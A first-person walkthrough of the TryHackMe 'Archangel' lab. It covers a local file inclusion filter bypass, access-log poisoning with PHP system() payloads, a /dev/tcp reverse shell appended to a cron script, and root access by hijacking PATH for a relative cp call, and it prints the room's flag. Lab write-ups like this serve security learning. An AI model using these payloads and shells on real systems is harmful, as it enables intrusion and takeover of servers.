Greetings everyone, hope you are well. Today I had the opportunity to  analyze `Archangel`, başmelek in Turkish from `TryHackMe` platform. 

Add your ip address to `hosts` file to make customizable domain. This is a local method to override `DNS resolution` and create your own domain mappings for testing, development, or other purposes.

### Run commands respectively

- `nano /etc/hosts`
- `<ipv4 address> <customized domain name>`
- `Control S and X`


### Final Result:

![[TryHackMe/Archangel/images/1.png]]


## Reconnaissance

The faster you conduct reconnaissance, the more time you gain for the `vulnerability detection` and `exploitation` phases. Cyber intelligence is always a significant asset in understanding the technology an application uses and its vulnerability scope.

As penetration testers, we frequently seek to move directly to the vulnerability exploitation phase, but we should first gather information about the target, whether it involves application testing or local area network assessments. That's why I conducted a `curl` scan to identify HTTP ports `80`, `443`, and Apache `8080`. If further investigation is required, we should also perform a full-port scan. The technique I usually use is a demand-based approach, meaning we apply what is necessary based on the situation.

Let's use `curl`:

`curl -v cuneyt.sevgi`

By default it will automatically move forward to port `80`

![[TryHackMe/Archangel/images/2.png]]

There is nothing on other ports `443` and `8080`:

![[TryHackMe/Archangel/images/3.png]]

Port `80` successfully identified web page's `html` structure and prompted as terminal output. Let me first analyze the source code's comment part and manually investigate with browser.

I saw an email address with domain `@mafialive.thm` as an internal information.

![[TryHackMe/Archangel/images/4.png]]

After a couple of page discover attempts, there was nothing especially uniquely identifiable data on the page content. Nearly entire page consisting default configuration texts, source files and so on... 

![[TryHackMe/Archangel/images/5.png]]

![[TryHackMe/Archangel/images/6.png]]

Majority of the navigation elements redirected me to empty hyperlinks. Therefore, it would be suitable to `fuzzing` phase.

I utilized couple of tools including `dirsearch`, `dirb`, `gobuster`.

### Used Payloads:

- dirsearch -u http://cuneyt.sevgi
- dirb http://cuneyt.sevgi
- gobuster dir http://cuneyt.sevgi -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt


I deliberately ended the `gobuster` scan due to the length of wordlist. It also detected the paths included in both `dirseach` and `dirb`.

![[TryHackMe/Archangel/images/7.png]]

![[TryHackMe/Archangel/images/8.png]]

![[TryHackMe/Archangel/images/9.png]]

`dirb` and `gobuster` was trying to recursively fuzz the entire directory structures ,so I terminated the process.

After I navigated through `/flags/` endpoint there was a file, redirected me to this page:

![[TryHackMe/Archangel/images/10.png]]

There was not any clues about `flags`. Therefore, it was suitable to conduct port scan. Furthermore, you can reach out the `web server` version & type.

![[TryHackMe/Archangel/images/13.png]]


![[TryHackMe/Archangel/images/11.png]]

Wappalyzer result:

![[TryHackMe/Archangel/images/12.png]]


I conducted different port scans with below commands:

`sudo nmap -sV -T4 -p 20-1000 cuneyt.sevgi`

`sudo nmap -sV -sC cuneyt.sevgi`

`sudo nmap -T4 -A cuneyt.sevgi`

However, the results were not sufficient to move to the `exploitation` phase. There must be undiscovered content on the web application or a web-based vulnerability to gain a shell on the target. That's why I would like to move the content referred to a youtube video where I previously demonstrated techniques in the `fuzzing` phase.

**Notice:** I could not find anything technical part such as dynamic page rendering content or backend instance. Observe the answer format: `something.***`.

![[TryHackMe/Archangel/images/15.png]]

After a long time, I was suspicious about the email and its domain. Although I tried different approach against target, I also wanted to add the given hostname `mafialive.thm`. Maybe there was another gate (web app or static page) for different `DNS resolution`. Technically, there was not anything since I applied main & essential methodologies on the instance.

**Immediately change & refresh the page then result was different:**

![[TryHackMe/Archangel/images/14.png]]

Let's check `test.php` and `robots.txt`.

![[TryHackMe/Archangel/images/16.png]]

Contents of endpoints:

![[TryHackMe/Archangel/images/17.png]]

`User-agent:` All bots (crawlers)
`Disallow:` These bots cannot crawl this endpoint.

![[TryHackMe/Archangel/images/18.png]]

It looks like `LFI/RFI`.

Full `URL` included form:

`http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php`

I tried to reach `etc/passwd` file in order to understand whether I have `LFI` or not. However, it did not work.

payload that I used:

`../../../../../etc/passwd`

![[TryHackMe/Archangel/images/19.png]]

Maybe the page initiates a `filtering` or `blocking` mechanism on the payload. Therefore, I covered `HackTricks`
about the `path/directory traversal` titled article. To understand how to bypass any restrictions. I have known this technique before since in Deloitte bootcamp, I specifically asked for `URL encoding` to make adaptable payload for target then immediately our instructor `Mücahit Ceri` told us that sometimes we cannot directly apply `LFI` instead we should find `wrapper` mechanism to pass filtering used by target application.

[PHP Filter Bypass & Wrappers](https://book.hacktricks.xyz/pentesting-web/file-inclusion)

Firstly, I attempted such payload as a fresh start:

`http://mafialive.thm/test.php?view=PhP://filter`

![[TryHackMe/Archangel/images/20.png]]

I used payload in a wrong way because it should be at the beginning of the endpoints ,but still it stucks then I switched on OWASP's guided [payload](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion):

![[TryHackMe/Archangel/images/23.png]]

`php://filter/convert.base64-encode/resource=/etc/passwd`

![[TryHackMe/Archangel/images/21.png]]

It did not work. After half an hour, I found a page where the payload adjusted as `php://filter/read=convert.base64-encode/resource=`.

[Adjusted payload resource](https://forum.hackthebox.com/t/htb-academy-file-inclusion/286531)

![[TryHackMe/Archangel/images/22.png]]

I tried for `/etc/hosts` ,yet would not work. However, I kept the path as it is then it worked & encoded `base64` formatted.

![[TryHackMe/Archangel/images/24.png]]

`http://mafialive.thm/test.php?view=

As you can see below, it gave us to the output of the `php` application called `mrrobot.php`.

![[TryHackMe/Archangel/images/25.png]]

Null byte injection could be suitable ,but it did not work `%00`.

`http://mafialive.thm/test.php?view=php://filter/read=convert.base64-encode/resource=/etc/passwd%00`

![[TryHackMe/Archangel/images/26.png]]

I have also retrieved `test.php` as an output xD (Does not necessary). On the other hand, instead of using `Cyberchef`as a decoder, I decided to work with different tool because I have never found something beneficial. 

Using this tool and trying it gave me the ultimate result:

[Base64 encoding/decoding](https://www.base64decode.org/)

```

<!DOCTYPE HTML>
<html>

<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>
 
    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
        <?php

	    //FLAG: thm{explo1t1ng_lf1}

            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    if(isset($_GET["view"])){
	    if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
            	include $_GET['view'];
            }else{

		echo 'Sorry, Thats not allowed';
            }
	}
        ?>
    </div>
</body>

</html>

```

Got it ! ! !

if the user attempts `../../` in the input field then it will be sanitized by application. Moreover,
secon constraint was the file path's itself user cannot try to navigate `/var/www/html/development_testing`. It first `$_GET[]`, built in PHP array responsible for content of the intended endpoint. `containStr` method tries to validate whether destination endpoint is consisting `/var/www/html/development_testing/` path.

For instance,
I attempted to read `/etc/passwd` file with the help of the `LFI` ,but it did not give me the /etc/passwd file in base64. Because of the restricted endpoint, I was not able to reach the target base64 formatted passwd file. Since it did not directly including main path. Due to the latest endpoint we were not allowed to move parent directories recursively by using `../../`. In addition, user must use more than two consecutive dots to reach `/` then reach `etc` directory.

`http://mafialive.thm/test.php?view=php://filter/read=convert.base64-encode/resource=/etc/passwd`

After that thanks to the source code, it was not tough to bypass resctrictions, I just added extra `//` between every `..` string.

`php://filter/read=convert.base64-encode/resource=/var/www/html/development_testing/..//..//..//..//etc/passwd`

![[TryHackMe/Archangel/images/27.png]]


we have such user:

`archangel:x:1001:1001:Archangel,,,:/home/archangel:/bin/bash`

In `Deloitte`'s Cyber bootcamp, we have learnt to how to use web servers logs to achieve log poisoning by reaching it `LFI`.

![[TryHackMe/Archangel/images/28.png]]

We do not need to use `php://filter` and base64 utility anymore because we found how to bypass restrictions. We should elevate `LFI` to `RCE` so as to reach initial compromise phase.

I found a useful resource to elevate LFI to RCE especially when intercepting burp's intercept to apply `reverse shell`. Firstly, I was wrong about the path to include commands. Instead of `error.log`, I should have analyzed `access.log` since access log stores mainly http requests ,so adversary can embed malicious commands or codes.

[LFI to RCE](https://medium.com/@YNS21/utilizing-log-poisoning-elevating-from-lfi-to-rce-5dca90d0a2ac)

Reason why we require to include `log` file is that I needed to include my payload as an internal process or command to target. Therefore, we have to run commands through headers located in each request.

![[TryHackMe/Archangel/images/29.png]]

Even if the web server running on `nginx`, we can also apply the same approach in `apache`.

PHP can be used in two different way:

`<?=`
`<?php`

In this scenario, you can achieve both with the help of `system()` method in `PHP`.

Used payload:

`<?php system('ls') ?>`
`<?= system('ls') ?>`

![[TryHackMe/Archangel/images/30.png]]


![[TryHackMe/Archangel/images/31.png]]



Let's try `PHP` one-liner reverse shell against target:

To get reverse shell, we can use [reverse shell generator](https://www.revshells.com/)(Web-Based) instead I would like to use my own tool called `shell_bringer`.

Reach out [here](https://github.com/onurcangnc/shell_bringer)

you can directly run the tool like this:

`python shell_bringer_test.py`

Follow my steps in below:

- Select option `1`
- Select `PHP` (option `9`)
- Give `IPv4` option as `4`
- Enter `TUN0` ip address.
- Enter intended port (1984)
- start with rlwrap or not

Program Output:

![[TryHackMe/Archangel/images/32.png]]

![[TryHackMe/Archangel/images/33.png]]


Now I wanted to understand default `cmd` variable's instance on target. `GET` method may help to achieve this since I could not abuse the `User-Agent` to retrieve reverse shell in each attempt server gets down. I needed to make `LFI` to `RFI` so as to make target eligible for downloading in my local files. Therefore, it would run directly it.

`<?php system($_GET['$cmd']) ?>`

Generating variable, used in url parameter as `cmd` can be suitable to include local python server's url.

![[TryHackMe/Archangel/images/34.png]]

As an example I generated `$cmd` variable in the target by using `access` log then intended to run `id` with the system method through command parameter (`$cmd`). 

![[TryHackMe/Archangel/images/35.png]]


Now we are the user `www-data` by default, reach the `user` flag from `archangel` user directory located on `/home/archangel`.

![[TryHackMe/Archangel/images/36.png]]

I could not find anything related to `privilege escalation` vector. That's why, I uploaded `linpeas.sh` from it's generic github repo. 

Reach out here below:

![[TryHackMe/Archangel/images/37.png]]

![[TryHackMe/Archangel/images/38.png]]

**Notice:** I deliberately downloaded on `tmp` directory because every user in `linux` can run commands from here.

Let's run it:

Observe we are the user on `web server`:

![[TryHackMe/Archangel/images/39.png]]

Crontab had direct horizontal privilege escalation vector in every minute user `archangel` was running `helloworld.sh` script.

![[TryHackMe/Archangel/images/40.png]]

From my perspective, I was able to modify the script let's see:

The script could be readable, writeable and every minute system calls it:

```

$ cat helloworld.sh
#!/bin/bash
echo "hello world" >> /opt/backupfiles/helloworld.txt

```

Now append the payload below:

`sh -i >& /dev/tcp/10.14.92.189/1900 0>&1`

I do not want to wait for it ,so I tried and blocked by kernel to run the script. Immediately, I got reverse shell. However, it was `www-data` because the script is ran by www-data service.

![[TryHackMe/Archangel/images/41.png]]

![[TryHackMe/Archangel/images/42.png]]

Patience was the strongest element in this CTF session :)

Get `flag 2` from `secret` directory located in `/home/archangel`

![[TryHackMe/Archangel/images/43.png]]

I tried generic command to understand the user's eligible binaries `sudo -l` ,but sudo requires tty terminal process let's upgrade shell:

![[TryHackMe/Archangel/images/44.png]]

Normally, most of the shell upgrade operations done by `python` binary ,so I checked for python binary and found `python3`:

![[TryHackMe/Archangel/images/45.png]]

[Full TTY shell](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)

I upgraded my shell by using such payload from above website:

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

![[TryHackMe/Archangel/images/46.png]]

I tried `sudo -l` ,yet asked me to give password. Therefore, I moved another strategy on `secret` directory. There was a binary named `backup` straightly running another service by root.

![[TryHackme/Archangel/images/47.png]]

When I attempted to run script, It gave an error indication `cp` operation on the directory not created.

![[TryHackMe/Archangel/images/48.png]]

I reminded that there was another directory on `opt` named `backupfiles`. What if we try to cp the provided path to the target.

![[TryHackMe/Archangel/images/49.png]]


However, this was not work since I did not have any files on this path.

`/home/user/archangel/myfiles/*`

What about embedding another binary `/bin/bash -i` so as to get root shell:

`cp` binary is called with a relative name instead of the absolute path so we can make it called a controlled one.

I used similar approach used from `GetTheFuckOutBinaries`.

-> [reach](https://gtfobins.github.io/gtfobins/cp/)

```

LFILE=file_to_write
TF=$(mktemp)
echo "DATA" > $TF
sudo cp $TF $LFILE

```

It gave me error indicating `Not a directory` ,so using `man` I found `mktemp` usage with -d parameter.

![[TryHackMe/Archangel/images/50.png]]

`man mktemp`

![[TryHackMe/Archangel/images/51.png]]

To make persistent my binary path `/bin/cp`, I also call the `PATH` variable and added my customized path to the target.

![[TryHackMe/Archangel/images/52.png]]

I was creating a binary path representing fake `cp` command ,but nearly similar as `/bin/cp`.
However, I manipulated correct path with `/bin/sh`. Since I gave all the users executable permissions, `backup` binary successfully executed the command ,yet it reached different path point, `/bin/sh`. Then directly invoked shell with root privileges because of the backup script's privileges.


```

erkanucar=$(mktemp -d)
echo '/bin/sh' > "$erkanucar/cp"
chmod a+x "$erkanucar/cp"
export PATH=$erkanucar:$PATH

```


Finally, reach the root flag from `/root/` path.


May The Pentest Be With You ! ! !

